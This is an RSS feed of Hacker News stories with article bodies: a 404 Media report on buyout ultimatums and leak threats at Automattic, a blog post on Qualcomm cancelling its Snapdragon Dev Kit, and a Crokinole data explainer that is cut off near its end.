<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Thu, 17 Oct 2024 20:30:03 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Employees Describe an Environment of Paranoia and Fear Inside Automattic (107 pts)]]></title>
            <link>https://www.404media.co/automattic-buyout-offer-wordpress-matt-mullenweg/</link>
            <guid>41872046</guid>
            <pubDate>Thu, 17 Oct 2024 18:04:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.404media.co/automattic-buyout-offer-wordpress-matt-mullenweg/">https://www.404media.co/automattic-buyout-offer-wordpress-matt-mullenweg/</a>, See on <a href="https://news.ycombinator.com/item?id=41872046">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <article>
          <div>
              
<!--kg-card-begin: html-->

<!--kg-card-end: html-->
<p>After an exodus of employees at Automattic who disagreed with CEO Matt Mullenweg’s recently divisive legal battle with WP Engine, he’s upped the ante with another buyout offer—and a threat that employees speaking to the press should “exit gracefully, or be fired tomorrow with no severance.”&nbsp;</p><p>Earlier this month, Mullenweg posed an “Alignment Offer” to all of his employees: Stand with him through a messy legal drama that’s still unfolding, or leave.&nbsp;</p><p>“It became clear a good chunk of my Automattic colleagues disagreed with me and our actions,” <a href="https://ma.tt/2024/10/alignment/?ref=404media.co"><u>he wrote on his personal blog</u></a> on Oct. 3, referring to <a href="https://www.404media.co/wordpress-checkbox-login-wp-engine/"><u>the ongoing dispute between himself and website hosting platform WP Engine</u></a>, which Mullenweg called a “cancer to WordPress” and accusing WP Engine of “strip-mining the WordPress ecosystem. In the last month, he and WP Engine have volleyed cease and desist letters, and WP Engine is now suing Automattic, accusing Mullenweg of extortion and abuse of power.</p><div><p>💡</p><p><b><strong>Do you know anything else about the situation inside Automattic, as a former or current employee? I would love to hear from you. Using a non-work device, you can message me securely on Signal at sam.404. Otherwise, send me an email at sam@404media.co.</strong></b></p></div><p>In the “Alignment Offer,” Mullenweg offered Automattic employees six months of pay or $30,000, whichever was higher, with the stipulation that they would lose access to their work logins that same evening and would not be eligible for rehire.</p><p>One hundred and fifty-nine people took the offer and left. “However now, I feel much lighter,” Mullenweg wrote in his blog.&nbsp;</p><p>But many stayed at Automattic even though they didn't agree with Mullenweg’s actions, telling 404 Media they remained due to financial strain or the challenging job market. Several employees who remained at the company describe a culture of paranoia and fear for those still there.&nbsp;</p><p>“Overall, the environment is now full of people who unequivocally support Matt's actions, and people who couldn't leave because of financial reasons (and those are mostly silent),” one Automattic employee told me.&nbsp;</p><p>The current and former Automattic employees I spoke to for this article did so under the condition of anonymity, out of concerns about retaliation from Mullenweg.&nbsp;</p><p>“I'm certain that Matt hasn't eliminated all dissenters, because I'm still there, but I expect that within the next six to twelve months, everyone who didn't leave but wasn't ‘aligned’ will have found a new job and left on their own terms,” another current employee told me. “My personal morale has never been lower at this job, and I know that I'm not alone.”</p><p>Mullenweg himself, in internal screenshots viewed by 404 Media, acknowledged that his first “Alignment Offer” did not make everyone who disagreed with him leave the company.&nbsp;</p><p>On Wednesday Mullenweg posted another ultimatum in Automattic’s Slack: a new offer that would include nine months of compensation (up from the previous offer of six months). Mullenweg wrote:&nbsp;</p><blockquote>“New alignment offer: I guess some people were sad they missed the last window. Some have been leaking to the press and ex-employees. That's water under the bridge. Maybe the last offer needed to be higher. People have said they want a new window, so this is my attempt. Here's a new one: You have until 00:00 UTC Oct 17 (-4 hours) to DM me the words, ‘I resign and would like to take the 9-month buy-out offer’ You don't have to say any reason, or anything else. I will reply ‘Thank you.’ Automattic will accept your resignation, you can keep you <em>[sic]</em> office stuff and work laptop; you will lose access to Automattic and Wong (no slack, user accounts, etc). HR will be in touch to wrap up details in the coming days, including your 9 months of compensation, they have a lot on their plates right now. You have my word this deal will be honored. We will try to keep this quiet, so it won't be used against us, but I still wanted to give Automatticians another window.”</blockquote><p>“We have technical means to identify the leaker as well, that I obviously can't disclose,” he continued. “So this is their opportunity to exit gracefully, or be fired tomorrow with no severance and probably a big legal case for violating confidentiality agreement.”&nbsp;</p><p>Mullenweg and Automattic did not respond to requests for comment.&nbsp;</p><p>This is the latest in what has been a tense few months at Automattic.&nbsp;</p><p>“Regarding escalations, to me, the most upsetting thing has been the way he's treating current and former employees and WP community members,” one former employee who recently left the company after several years told me. “He clearly has no clue what people care about or how the community has contributed to the success of WordPress. It very clearly shows how out of touch he is with everyday reality. One, sharing pictures of him being on safari while all this shit is going down, as if people would think that was cool. Only rich tech bros would think that.” (Mullenweg posted photos from a trip on his <a href="https://ma.tt/2024/10/rhino-dehorning/?ref=404media.co"><u>personal blog</u></a> and <a href="https://www.threads.net/@photomatt/post/DA0WWnTsESD?ref=404media.co"><u>social media posts</u></a> last week.)&nbsp;</p><figure><a href="https://www.404media.co/wordpress-checkbox-login-wp-engine/"><div><p>‘The Community Is In Chaos:’ WordPress.org Now Requires You Denounce Affiliation With WP Engine To Log In</p><p>WordPress.org users are forced to confirm they are not “affiliated with WP Engine in any way, financially or otherwise” before registering a new account or logging in.</p><p><img src="https://www.404media.co/content/images/size/w256h256/format/png/2023/08/favicon-3.svg" alt=""><span>404 Media</span><span>Samantha Cole</span></p></div><p><img src="https://www.404media.co/content/images/size/w1200/2024/10/wp--1-.png" alt="" onerror="this.style.display = 'none'"></p></a></figure><p>In July, before the latest WP Engine blowup, an Automattic employee wrote in Slack that they received a direct message from Mullenweg sending them an identification code for Blind, an anonymous workplace discussion platform, which was required to complete registration on the site. Blind requires employees to use their official workplace emails to sign up, as a way to authenticate that users actually work for the companies they are discussing. Mullenweg said on Slack that emails sent from Blind’s platform to employees’ email addresses were being forwarded to him. If employees wanted to log in or sign up for Blind, they’d need to ask Mullenweg for the two-factor identification code. The implication was that Automattic—and Mullenweg—could see who was trying to sign up for Blind, which is often a place where people anonymously vent or share criticism about their workplace.&nbsp;&nbsp;</p><p>“We were unaware that Matt redirected sign-up emails until current Automattic employees contacted our support team,” a spokesperson for Blind told me, adding that they’d “never seen a CEO or executive try to limit their employees from signing up for Blind by redirecting emails.”</p><p>Mullenweg didn’t block emails from the @teamblind.com domain, Blind said. According to Slack messages viewed by 404 Media, instead, he redirected those emails to himself. </p><p>“We are disappointed when we hear employers or executives try to limit access to Blind. Some of the most commonly discussed topics on Blind are protected speech in the U.S.—pay, job terminations, critiques of workplace conditions—which we believe workers should be free to access and discuss. Blind's mission is to bring transparency to the workplace, as we believe it can inspire meaningful change,” the spokesperson for Blind said. “Employers' attempts to block Blind are misguided and often have the opposite intended effect. Generally, we have seen more employees register and use Blind when their company tries to restrict access.”&nbsp;</p><blockquote>“The escalation since then just confirmed I made the right choice." </blockquote><p>One Automattic employee told me that Mullenweg’s interception of Blind emails was the thing that made them start looking for a new job. “For Matt to do that, without prior announcement, was equivalent to spying on his employees. And for him to think it's ok to tell people to message him for their verification code is ridiculous—I've never questioned an employer's judgment as much as I did in that moment (although it has happened many times since),” they said. “Clearly, Blind is designed to allow employee discussion free from employer interference, and he was trying to prevent that in the most obvious way possible.”&nbsp;</p><p>Instead of Blind, employees have been posting on Anonymattic, an anonymous message board set up on WordPress’s own systems that allows all employees to post using one login.&nbsp;</p><p>“A common theme for posts on Anonymattic is ‘Any time I try to get work done, some new drama comes up and I get distracted.’ I know that's true for me,” an employee told me.&nbsp;</p><p>“There is a vocal group of sycophants who are cheering on Matt's actions via Anonymattic,” they said, “drawing favorable comparisons to how Elon Musk and Donald Trump operate. Their morale seems high, but I can't relate.” Screenshots viewed by 404 Media show some staff having changed their Slack usernames to include “[STAYING]” to signal their support of Mullenweg and intention to remain at the company.&nbsp;</p><p>Anonymattic was “conveniently closed down around Covid with the excuse of avoiding toxic discussions,” an employee told me. “I say conveniently because people would post their opinions and complaints to leadership that were sometimes uncomfortable. That’s when the Blind migration happened.” They said they believe Mullenweg’s interference with Blind emails was “an attempt to stop employees from joining Blind in some kind of intimidating fashion (are they collecting who is joining Blind? With what intentions?)” Anonymattic was reopened around that time, they said.</p><p>“At the end, even if anonymous, Automattic can delete posts there and not in Blind,” they said.</p><p>Last week, in response to someone criticizing his decision to add a checkbox to the WordPress.org login that forced users to denounce affiliation with WP Engine, Mullenweg posted in the WordPress contributor community Slack, “Wait until you see what we have in store for Thursday! And Friday. And Saturday. And Sunday. And Monday.” Several people posted vomiting and face-palm emojis in response to that message.</p><p>A recently-departed employee told me that the WP Engine legal drama wasn’t their final straw. “But in hindsight, it should have been,” they said. “The escalation since then just confirmed I made the right choice. At the time, I thought Matt might have a point about the trademarks (something I know little about), but he did say at the time he was going to treat this like a war and continue escalating it, because the truth was on his side. I guess we’re now seeing what that really meant."&nbsp;</p>
                    <div>
    <div>
      <p>About the author</p>
      <p>Sam Cole is writing from the far reaches of the internet, about sexuality, the adult industry, online culture, and AI. She's the author of How Sex Changed the Internet and the Internet Changed Sex.</p>
      
    </div>
      <p><img data-src="/content/images/2023/08/404-sam-10--1-.jpg" alt="Samantha Cole" src="https://www.404media.co/content/images/2023/08/404-sam-10--1-.jpg">  
      </p>
  </div>
          </div>
        </article>
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Qualcomm cancels Snapdragon Dev Kit, refunds all orders (109 pts)]]></title>
            <link>https://www.jeffgeerling.com/blog/2024/qualcomm-cancels-snapdragon-dev-kit-refunds-all-orders</link>
            <guid>41871899</guid>
            <pubDate>Thu, 17 Oct 2024 17:50:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.jeffgeerling.com/blog/2024/qualcomm-cancels-snapdragon-dev-kit-refunds-all-orders">https://www.jeffgeerling.com/blog/2024/qualcomm-cancels-snapdragon-dev-kit-refunds-all-orders</a>, See on <a href="https://news.ycombinator.com/item?id=41871899">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><img width="700" height="auto" src="https://www.jeffgeerling.com/sites/default/files/images/snapdragon-developer-kit-for-windows-box.jpeg" alt="Snapdragon Developer Kit for Windows"></p>

<p>This afternoon I received the following email from Arrow, regarding the <a href="https://www.arrow.com/en/products/c8380-12c-mp-32g/thundercomm">Snapdragon Developer Kit for Windows</a>:</p>

<blockquote>
  <p>Dear Valued Customer,</p>
  
  <p>Please see this important message from Qualcomm:</p>
  
  <p>”At Qualcomm, we are dedicated to pioneering leading technology and delivering premium experiences to our valued customers. The launch of 30+ Snapdragon X-series powered PC's is a testament to our ability to deliver leading technology and the PC industry's desire to move to our next-generation technology. However, the Developer Kit product comprehensively has not met our usual standards of excellence and so we are reaching out to let you know that unfortunately we have made the decision to pause this product and the support of it, indefinitely.</p>
  
  <p>Working with the developer community is a priority for Qualcomm. If you want to learn more about Windows on Snapdragon, please engage with us on Discord or head to our developer portal on Qualcomm.com. If you are ready to build your next gen AI PC application, visit the Qualcomm Device Cloud (QDC) today.</p>
  
  <p>Qualcomm has authorized a refund for any charges that have been made by Arrow.“</p>
  
  <p>Based upon the above, we are working to provide a full refund for any charges to your account for your purchase. You should receive this credit/refund within 10 business days. It is not necessary to return any material, if received. Unfortunately, any outstanding orders will be cancelled.</p>
  
  <p>Thank you for your understanding,
  Arrow</p>
</blockquote>

<p>It sounds like they are cancelling all existing orders, but I'm not sure if those who <em>did</em> receive units will also be refunded. I'll update this post if I see a refund for it.</p>

<h2>Qualcomm's Failure to Launch</h2>

<p>I've <a href="https://www.jeffgeerling.com/blog/2024/where-qualcomms-snapdragon-x-elite-dev-kit">covered the long and drawn out struggle Qualcomm had shipping their Snapdragon X Elite Developer Kit</a> already.</p>

<div>
<p><iframe src="https://www.youtube.com/embed/gpFSCACqDqQ" frameborder="0" allowfullscreen=""></iframe></p>
</div>

<p>And after months of waiting—Arrow's web store originally said it would 'ship tomorrow' in July—I received my unit in late September. I <a href="https://www.jeffgeerling.com/blog/2024/qualcomm-snapdragon-dev-kit-windows-teardown-2024">did a teardown</a>, then got to work on a <a href="https://www.jeffgeerling.com/blog/2024/snapdragon-dev-kit-windows-fastest-x-elite-tested">full review of the Dev Kit for Windows</a>.</p>

<p>My conclusion in that review was:</p>

<blockquote>
  <p>The Snapdragon Dev Kit is a missed opportunity.</p>
</blockquote>

<p>Indeed. But hopefully Microsoft and Qualcomm can figure out a way to make a compelling small desktop offering with Snapdragon X—something not so strongly associated with the failed CoPilot+ launch.</p>

<p>If it happens, it sounds like Qualcomm won't be making the device, relying instead on an OEM partner.</p>

<p>I feel sorry for the hardware team at Qualcomm who worked on this project, because it had a lot of promise, just too many roadblocks to make it successful. Windows on Arm could certainly use more developer focus, and a great developer workstation (which is more readily available) would help with that.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Crokinole (241 pts)]]></title>
            <link>https://pudding.cool/2024/10/crokinole/</link>
            <guid>41871375</guid>
            <pubDate>Thu, 17 Oct 2024 16:54:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pudding.cool/2024/10/crokinole/">https://pudding.cool/2024/10/crokinole/</a>, See on <a href="https://news.ycombinator.com/item?id=41871375">Hacker News</a></p>
<div id="readability-page-1" class="page"><section id="story">    <p><!-- HTML_TAG_START -->What you’re seeing below is two of Crokinole’s greats simultaneously securing perfect rounds.<!-- HTML_TAG_END --></p>  <figure><video src="https://pudding.cool/2024/10/crokinole/assets/videos/perfect.mp4" poster="https://pudding.cool/2024/10/crokinole/assets/images/perfect.jpg" preload="true" autoplay="" loop="" muted="" playsinline=""></video>  <figcaption><!-- HTML_TAG_START -->Double perfect round. Watch on <a href="https://www.youtube.com/watch?v=wVuA3B4zR7Q" target="_blank" rel="noreferrer">YouTube</a>.<!-- HTML_TAG_END --></figcaption> </figure>  <p><!-- HTML_TAG_START -->Technically speaking, they each flicked a 3.2cm disc 30cm across a board into a 3.5cm hole (just 9% wider than the disc itself) eight times in a row. In game terms, they made eight open 20s each.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START --><strong>But it’s just flicking a little disc across a small board. How hard can it be, really?</strong><!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->The mesmerizing 56 seconds above were captured at the semifinals of the 2024 World Crokinole Championship, where Connor Reinman defeated Jason Slater. A matchup not unlike Magic vs. Bird, or Swift vs. Eilish.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->How rare was this feat of perfection? Was this one of those obscure new Olympic events? You may even be wondering, wtf is Crokinole?<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->We’ll get to all these questions. <strong>But first, you must understand Crokinole.</strong><!-- HTML_TAG_END --></p>  <figure><img src="https://pudding.cool/2024/10/crokinole/assets/images/ontario.jpg" alt="Map highlighting the southern region of Ontario"> <figcaption><!-- HTML_TAG_START -->The game’s origin: the southern region of Ontario.<!-- HTML_TAG_END --></figcaption> </figure>  <p><!-- HTML_TAG_START -->If you are from the southern region of the Canadian province of Ontario, you may already be well-versed in Crokinole due to its <a href="https://www.canadashistory.ca/explore/arts-culture-society/crokinole" target="_blank" rel="no_referrer">Canadian origin.</a> For the uninitiated, Crokinole is like a mashup of shuffleboard and curling, played on a tabletop board. It’s been around since the 19th century but has seen a steady rise in global popularity in recent years.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->To know the game, one must play the game. <br><strong>Let your training begin.</strong><!-- HTML_TAG_END --></p>  <div><div> <p><!-- HTML_TAG_START -->The main objective is to flick your discs into higher-scoring regions. <strong>The center hole is worth 20 points.</strong> Be careful, though—eight pegs surround the fifteen-point region.<!-- HTML_TAG_END --></p> <p><!-- HTML_TAG_START -->Here, <span>your opponent</span> shoots on an empty board. To be a valid shot (and stay on the board) the disc must land within the <span>15-point region.</span><!-- HTML_TAG_END --></p> <p><!-- HTML_TAG_START -->If any <span>opponent discs</span> are on the board, <span>your disc</span> must hit one to be valid and stay on the board.<!-- HTML_TAG_END --></p> <p><!-- HTML_TAG_START --><strong>Give it a try:</strong> Hit your <span>opponent’s disc.</span> Use the <strong>slider and button</strong> below the board to position your disc. Then aim, hold the shoot button to find the perfect power, and release.<!-- HTML_TAG_END --></p> <p><!-- HTML_TAG_START -->If you shoot and it is an invalid shot, <span>your disc</span> is removed from the board and is not scored.<!-- HTML_TAG_END --></p> <p><!-- HTML_TAG_START -->It’s your turn, and there are <span>no opponent discs</span>. You just need to land in the fifteen-point region, <strong>but scoring a 20 is ideal.</strong> A made 20 is set aside and counted.<!-- HTML_TAG_END --></p> <p><!-- HTML_TAG_START --><strong>Give it a try:</strong> Shoot <span>your disc</span> into the center hole to secure the 20 points.<!-- HTML_TAG_END --></p> <p><!-- HTML_TAG_START -->After all sixteen discs are played, points are tallied based on the regions and any 20s. The round winner is the player with the most points, and a game consists of multiple rounds.<!-- HTML_TAG_END --></p></div> <figure></figure> </div>  <figure><video src="https://pudding.cool/2024/10/crokinole/assets/videos/keanu.mp4" poster="https://pudding.cool/2024/10/crokinole/assets/images/keanu.jpg" preload="true" autoplay="" loop="" muted="" playsinline=""></video>   </figure>  <p><!-- HTML_TAG_START -->Easy Keanu, that was just the basics. We didn’t even get to the one-cheek rule (yes, that cheek). For more details you can <a href="https://youtu.be/R-6hdqdYPpE" target="_blank" rel="noreferrer">watch this video</a> or <a href="http://nationalcrokinoleassociation.com/resources/rules.html" target="_blank" rel="noreferrer">read the rules</a>.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->Oh, and feel free to go play—we made <a href="https://pudding.cool/2024/10/crokinole/play">a simulator</a> for you to hone your skills against a bot.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->You are ready for the next part of the journey. <strong>What does the data tell us about Connor Reinman and Jason Slater?</strong><!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->Reinman, the back-to-back world champion, and Slater, the perennial powerhouse, are arguably the greatest players right now on the world stage.<!-- HTML_TAG_END --></p>  <figure><img src="https://pudding.cool/2024/10/crokinole/assets/images/bump.png" alt="Bump chart of player rankings over the past 10 years"> <figcaption><!-- HTML_TAG_START -->Player rankings according to <a href="http://crokinolereference.com/" target="_blank" rel="noreferrer"> Crokinole Reference.</a> No matches from 2021-2022.<!-- HTML_TAG_END --></figcaption> </figure>  <p><!-- HTML_TAG_START -->But how good are they? Let’s start by looking at their ability to make open 20s, an indispensable skill for success. <strong>Here’s how competitive players compare in open 20 success rates.</strong><!-- HTML_TAG_END --></p>    <div><table> <thead><tr> <th>Player</th> <th>Attempts</th> <th>Percent Made</th></tr></thead> <tbody> <tr> <td><!-- HTML_TAG_START -->Justin Slater<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->594<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->75.6%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Josh Carrafiello<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->334<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->68.0%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Connor Reinman<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->703<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->66.0%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Andrew Hutchinson<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->619<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->65.9%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Ron Langill<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->108<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->65.7%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Travis Keener<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->63<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->65.1%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Robert Bonnett<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->74<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->62.2%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Darren Carr<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->103<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->62.1%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Jason Beierling<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->184<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->57.6%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Ray Beierling<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->302<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->57.3%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Nolan Tracey<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->95<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->56.8%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Nathan Walsh<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->164<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->55.5%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Jeremy Tracey<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->184<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->49.5%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Jon Conrad<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->69<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->43.5%<!-- HTML_TAG_END --></td> </tr></tbody></table> <p><em>Note: <!-- HTML_TAG_START -->Minimum 50 attempts from the 2023-2024 season.<!-- HTML_TAG_END --></em></p> </div>  <p><!-- HTML_TAG_START -->Reinman and Slater are top competitors in open 20s, with success rates of 66% and 75%, compared to the average competitive player’s 55%.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->For basketball fans: a Crokinole player making eight consecutive 20s in live play is like an NBA player sinking 20 straight free throws during a game—not impossible, but far from common.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->How do they compare to casual players? Observing players with varying experience, success rates for in-game open 20s ranged from 20% to 50%.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->The odds of two opponents making eight consecutive shots can vary greatly depending on their skill level. <strong>Here are the odds of a double perfect round.</strong><!-- HTML_TAG_END --></p>  <div><table> <thead><tr> <th>Type of Players</th> <th>Open 20 Pct.</th> <th>Odds</th></tr></thead> <tbody> <tr> <td><!-- HTML_TAG_START -->Slater vs Reinman<sup>*</sup><!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->~70%<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->1 in 277 rounds<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Top Competitive<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->65%<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->1 in 985<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Average Competitive<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->55%<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->1 in 14,263<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Great Recreational<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->50%<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->1 in 65,536<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Good Recreational<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->45%<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->1 in 353,671<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Novice Recreational<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->35%<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->1 in 19,720,199<!-- HTML_TAG_END --></td> </tr></tbody></table> <p><em>Note: <!-- HTML_TAG_START -->Slater makes 75% and Reinman makes 66% on open 20s.<!-- HTML_TAG_END --></em></p> </div>  <p><!-- HTML_TAG_START -->Our theoretical scenarios show how even a slight drop in skill greatly impacts the odds. To witness this rare event, both top players must hit a hot streak at the same time.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->These percentages reflect in-game attempts, where a player’s rhythm is disrupted by various shots. In non-competitive, less plamigerent settings, their skills really shine—like Shawn Hagarty, who set an unofficial record with 64 consecutive open 20s.<!-- HTML_TAG_END --></p>  <figure><video src="https://pudding.cool/2024/10/crokinole/assets/videos/record.mp4" poster="https://pudding.cool/2024/10/crokinole/assets/images/record.jpg" preload="true" autoplay="" loop="" muted="" playsinline=""></video>  <figcaption><!-- HTML_TAG_START -->64 straight open 20s by Shaw Hagarty. Watch on <a href="https://www.youtube.com/watch?v=Lmp_-1ifOPc" target="_blank" rel="noreferrer">YouTube</a>.<!-- HTML_TAG_END --></figcaption> </figure>  <p><!-- HTML_TAG_START -->However, real games are far more nuanced and complex. Players — or their opponents — often miss early on. Here’s what the data reveals after analyzing 300 rounds from various matchups in last season’s tournaments.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START --><strong>At Which Shot an Open 20 is First Missed in Competitive Matches</strong><!-- HTML_TAG_END --></p>  <div><div> <p><strong>Double perfect round</strong> <br>
				No misses<br>↓</p></div> <p><em>Note: <!-- HTML_TAG_START -->Based on 300 rounds from final to quarterfinal matches in the past year.<!-- HTML_TAG_END --></em></p> </div>  <p><!-- HTML_TAG_START -->More often than not, the elusive double perfect round is lost right at the start. But I’ve been discussing this in the context of the most elegant form — a “pure” double perfect round, where all 16 shots are made as open 20s.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->Technically, though, a miss doesn’t completely rule out a perfect round. A perfect round can (and often does) include a combination of open 20s and ricochet 20s, where a disc bounces in off the opponent’s.<!-- HTML_TAG_END --></p>  <figure><video src="https://pudding.cool/2024/10/crokinole/assets/videos/ricochet.mp4" poster="https://pudding.cool/2024/10/crokinole/assets/images/ricochet.jpg" preload="true" autoplay="" loop="" muted="" playsinline=""></video>  <figcaption><!-- HTML_TAG_START -->Ricochet 20s by Justin Slater and Andrew Hutchinson. Watch on <a href="https://www.youtube.com/watch?v=Iyn64Sn_yqI" target="_blank" rel="noreferrer">YouTube</a>.<!-- HTML_TAG_END --></figcaption> </figure>  <p><!-- HTML_TAG_START -->The perfect blend of aim and power is required to perfect shots like those. Try it yourself: can you achieve the feel-good ricochet 20?<!-- HTML_TAG_END --></p>    <p><!-- HTML_TAG_START -->Going for a 20 isn’t always the best or even a viable option. Discs on the board introduce more exciting scenarios that add layers of strategy.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->Having all your discs on your side is usually a strong defensive position, but watching your opponent dismantle it can be demoralizing. That’s exactly what happened in this round between Andrew Hutchinson and Nolan Tracey.<!-- HTML_TAG_END --></p>  <figure><video src="https://pudding.cool/2024/10/crokinole/assets/videos/triple.mp4" poster="https://pudding.cool/2024/10/crokinole/assets/images/triple.jpg" preload="true" autoplay="" loop="" muted="" playsinline=""></video>  <figcaption><!-- HTML_TAG_START -->Triple takeout by Nolan Tracey. Watch on <a href="https://www.youtube.com/watch?v=B3zaxfzEfXc" target="_blank" rel="noreferrer">YouTube</a>.<!-- HTML_TAG_END --></figcaption> </figure>  <p><!-- HTML_TAG_START -->The Slater-Reinman round was the only double perfect in a review of 445 highly competitive rounds in the past year. One thing is certain: more skilled players tend to keep the board clear and make open 20s at a higher rate, increasing the chance of glimpsing a pure double perfect round.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->If there’s one takeaway, it’s that Crokinole is fun and the community is awesome. Whether you’re playing to win or just flicking a few rounds with Grandma during the holidays, it’s a great time.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START --><strong>So, maybe you’re into Crokinole now?</strong> Here are some resources to help you get started, or go get some practice in with <a href="https://pudding.cool/2024/10/crokinole/play">the simulator</a>.<!-- HTML_TAG_END --></p>  <ul><li><!-- HTML_TAG_START --><a href="http://nationalcrokinoleassociation.com/clubs.html" target="_blank" rel="noreferrer">Find</a> a <a href="https://traceyboards.com/crokinole-connections-map/" target="_blank" rel="noreferrer">club</a><!-- HTML_TAG_END --></li><li><!-- HTML_TAG_START -->Buy a board <a href="https://traceyboards.com/" target="_blank" rel="noreferrer">here</a> (or <a href="https://muzzies.ca/" target="_blank" rel="noreferrer">here</a>, <a href="https://www.browncastlegames.com/" target="_blank" rel="noreferrer">here</a>, <a href="https://crokinole.ca/" target="_blank" rel="noreferrer">here</a>)<!-- HTML_TAG_END --></li><li><!-- HTML_TAG_START --><a href="https://www.youtube.com/@TraceyBoardsWatch" target="_blank" rel="noreferrer">Watch some matches</a><!-- HTML_TAG_END --></li><li><!-- HTML_TAG_START --><a href="https://www.youtube.com/watch?v=qyH7o1FYkcU" target="_blank" rel="noreferrer">Listen</a> to some <a href="https://www.youtube.com/watch?v=OF3JfiexLVA" target="_blank" rel="noreferrer">jams</a><!-- HTML_TAG_END --></li><li><!-- HTML_TAG_START --><a href="https://www.reddit.com/r/Crokinole/" 